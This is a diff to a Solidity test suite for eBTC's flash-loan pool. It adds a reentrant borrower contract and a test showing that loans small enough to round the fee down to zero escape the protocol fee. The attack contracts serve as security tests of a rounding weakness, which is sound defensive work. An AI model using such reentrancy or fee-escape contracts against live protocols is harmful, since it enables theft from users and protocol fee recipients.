@@ -11,6 +11,12 @@ import "../contracts/Interfaces/IERC3156FlashLender.sol";
  * FlashLoan ReEntrancy Attack
  */
 
+interface IActivePool {
+    function feeRecipientAddress() external view returns (address);
+
+    function feeBps() external view returns (uint256);
+}
+
 contract FlashAttack {
     IERC20 public immutable want;
     IERC3156FlashLender public immutable lender;
@@ -39,6 +45,37 @@ contract FlashAttack {
             // Perform a second loan
             uint256 _amt = (amount + abi.decode(data, (uint256)));
             lender.flashLoan(IERC3156FlashBorrower(address(this)), address(want), _amt, data);
+        }
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
+
+contract FlashFeeEscapeBorrower {
+    IERC20 public immutable want;
+    IERC3156FlashLender public immutable lender;
+    uint256 public counter;
+
+    constructor(IERC20 _want, IERC3156FlashLender _lender, uint256 _amt) {
+        want = _want;
+        lender = _lender;
+
+        // Approve to repay
+        IERC20(_want).approve(address(_lender), type(uint256).max);
+        counter = _amt;
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        require(token == address(want));
+
+        if (IERC20(want).balanceOf(address(this)) < counter) {
+            lender.flashLoan(IERC3156FlashBorrower(address(this)), address(want), amount, data);
         }
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
@@ -159,5 +196,34 @@ contract FlashLoanAttack is eBTCBaseFixture {
             amount,
             abi.encodePacked(uint256(0))
         );
+    }
+
+    function testFeeEscapeAttack() public {
+        uint256 _feeBps = IActivePool(address(activePool)).feeBps();
+        uint256 amount = 10000 / IActivePool(address(activePool)).feeBps();
+        uint256 totalAmount = amount * _feeBps;
+
+        uint256 fee = activePool.flashFee(address(collateral), amount);
+
+        vm.assume(fee == 0);
+
+        FlashFeeEscapeBorrower attacker = new FlashFeeEscapeBorrower(
+            IERC20(address(collateral)),
+            IERC3156FlashLender(address(activePool)),
+            amount
+        );
+
+        dealCollateral(address(activePool), totalAmount * 2);
+
+        address _feeRecipient = IActivePool(address(activePool)).feeRecipientAddress();
+        uint256 _feeBefore = IERC20(address(collateral)).balanceOf(_feeRecipient);
+        activePool.flashLoan(
+            IERC3156FlashBorrower(address(attacker)),
+            address(collateral),
+            amount,
+            abi.encodePacked(amount)
+        );
+        uint256 _feeAfter = IERC20(address(collateral)).balanceOf(_feeRecipient);
+        require(_feeAfter == _feeBefore, "!flash fee should be zero due to division loss");
     }
 }
